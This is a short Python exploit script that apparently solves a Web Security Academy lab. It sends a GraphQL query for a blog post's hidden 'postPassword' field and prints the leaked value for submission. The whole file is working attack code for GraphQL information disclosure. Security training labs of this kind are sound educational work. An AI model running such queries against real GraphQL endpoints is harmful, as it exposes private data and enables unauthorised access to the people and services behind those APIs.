import requests
import sys
import json

json_payload = {
    "query": """
        query getBlogPost($id: Int!) {
            getBlogPost(id: $id) {
                image
                title
                author
                date
                paragraphs
                postPassword
            }
        }
    """,
    "operationName": "getBlogPost",
    "variables": {
        "id": 3
    }
}
def req(url):
    headers = {
        'Content-Type': 'application/json'
    }
    vuln_path = url+'/graphql/v1'
    r = requests.post(url=vuln_path, headers=headers, json=json_payload)
    data = r.json()
    blog_post = data.get('data', {}).get('getBlogPost', {})
    if blog_post:
        print("Copy the value and paste it in Submit Solution to solve the lab.")
        print('postPassword:',blog_post.get('postPassword'))
    else:
        print("failed!")
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s https://xxxxxxxxxxxxxxxxxxxxxxxxx.web-security-academy.net" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("Exploiting...")
    req(url)


if __name__=='__main__':
    main()